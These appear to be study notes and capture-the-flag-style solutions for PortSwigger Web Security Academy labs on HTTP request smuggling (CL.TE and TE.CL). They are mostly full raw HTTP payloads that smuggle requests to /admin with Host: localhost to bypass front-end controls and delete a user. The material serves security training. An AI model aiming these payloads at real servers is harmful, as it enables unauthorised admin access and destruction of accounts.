# Exploiting HTTP request smuggling vulnerabilities
# Using HTTP request smuggling to bypass front-end security controls
- In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. 
- Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.
- For example, suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL. 
- The back-end server then honors every request without further checking. 
- In this situation, an HTTP request smuggling vulnerability can be used to bypass the access controls, by smuggling a request to a restricted URL.
- Suppose the current user is permitted to access /home but not /admin. 
- They can bypass this restriction using the following request smuggling attack:

```HTTP
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```
- The front-end server sees two requests here, both for /home, and so the requests are forwarded to the back-end server. 
- However, the back-end server sees one request for /home and one request for /admin. 
- It assumes (as always) that the requests have passed through the front-end controls, and so grants access to the restricted URL

# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. 
- There's an admin panel at /admin, but the front-end server blocks access to it.

- To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

# Solution
- Try to visit /admin and observe that the request is blocked.
- Using Burp Repeater, issue the following request twice:
```HTTP
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
- Observe that the merged request to /admin was rejected due to not using the header Host: localhost.
- Issue the following request twice:
```HTTP
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```
- Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
- Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
```HTTP
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

bee=
```
- Observe that you can now access the admin panel.
- Using the previous response as a reference, change the smuggled request URL to delete carlos:
```HTTP
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

bee=
```

# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. 
- There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

# Solution
- First find the TE.CL with this payload
```HTTP
POST / HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

```
- Once you found it confirm the vuln by sending this request payload twice

```HTTP
POST / HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a2
POST /hope404 HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=
0

```
- Once the TE.CL is confirmed smuggle request to the admin page by sending this request payload twice
```HTTP
POST / HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a0
POST /admin HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=
0

```
- Notice that the 401 message says only local user can access admin panel
- Bypass this using this request payload
```HTTP
POST / HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

70
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=
0

```
- Complete the lab by using this request payload
```HTTP
POST / HTTP/1.1
Host: 0a6a006a03c261798211067f002600b3.web-security-academy.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=
0

```
- Run the request twice and notice user carlos is deleted 



